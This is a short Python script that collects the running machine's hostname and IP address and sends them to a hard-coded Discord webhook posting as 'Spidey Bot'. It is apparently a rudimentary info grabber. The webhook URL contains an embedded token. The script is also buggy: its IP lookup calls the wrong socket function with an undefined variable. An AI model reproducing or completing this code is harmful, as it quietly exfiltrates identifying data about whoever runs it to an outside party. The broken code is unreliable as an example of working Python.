import socket
host_name = socket.gethostname()
ip_adress = socket.gethostname(hostname)
print ("Host name: ", host_name)
print ("IP: ", ip_adress)

from discord_webhook import DiscordWebhook, DiscordEmbed
content = "Placeholder message"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1402945962154000414/eWiPVLR8AoPd8WUFdfRJPZIeV4W7EkOuEvezehhmWy_NjlZP51959mRxx7vHqGGjSI93", username="Spidey Bot", content=content)
embed = DiscordEmbed(title="IP: " + ip_adress + "host: " + host_name, color = 123123)
webhook.add_embed(embed)
response = webhook.execute()
